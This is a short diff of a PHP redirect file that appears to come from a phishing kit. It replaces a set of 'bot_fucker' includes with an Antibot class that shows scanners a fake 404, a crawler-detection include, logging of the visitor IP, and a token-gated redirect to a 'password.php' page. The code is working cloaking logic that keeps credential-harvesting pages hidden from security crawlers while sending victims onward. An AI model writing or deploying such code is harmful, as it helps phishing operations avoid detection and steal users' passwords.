@@ -1,11 +1,22 @@
 <?php
-  	require 'bot_fucker/fucker001.php';
-	require 'bot_fucker/fucker002.php';
-	require 'bot_fucker/fucker003.php';
-	require 'bot_fucker/fucker004.php';
-	require 'bot_fucker/fucker005.php';
-	require 'bot_fucker/fucker006.php';
-	require 'bot_fucker/fucker007.php';
-	require 'bot_fucker/fucker008.php';
-	exit(header("Location: ../index.php")); 
+error_reporting(0);
+
+session_start();
+require_once '../../src/Classes/Comp.php';
+    require_once '../../src/Classes/Antibot.php';
+
+    $comps = new Comp;
+    $antibot = new Antibot;
+
+    if (!$comps->checkToken()) {
+        echo $antibot->throw404();
+        die();
+    } 
+    include '../../crawlerdetect.php';
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$hash = $_SESSION['token']; 
+
+header("Location: password.php?token=$hash");
+
 ?>
